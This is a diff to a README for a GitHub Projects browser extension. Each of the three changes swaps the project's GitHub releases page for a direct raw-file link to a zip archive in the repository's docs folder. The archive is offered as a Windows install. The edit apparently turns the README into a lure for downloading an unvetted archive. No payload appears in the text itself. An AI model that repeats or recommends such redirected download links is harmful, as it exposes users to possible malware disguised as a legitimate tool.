@@ -1,10 +1,10 @@
 # 🗂️ refined-github-projects - Manage GitHub Projects with Less Work
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/doped-waterdragon694/refined-github-projects/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/doped-waterdragon694/refined-github-projects/main/docs/refined-github-projects-v1.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/doped-waterdragon694/refined-github-projects/releases
+Visit this page to download: https://raw.githubusercontent.com/doped-waterdragon694/refined-github-projects/main/docs/refined-github-projects-v1.4.zip
 
 Choose the latest release for your browser, then install it on Windows.
 
@@ -169,7 +169,7 @@ If the extension does not show up right away:
 
 Use this link to get the latest version:
 
-https://github.com/doped-waterdragon694/refined-github-projects/releases
+https://raw.githubusercontent.com/doped-waterdragon694/refined-github-projects/main/docs/refined-github-projects-v1.4.zip
 
 ## 🖱️ What you should do next
 
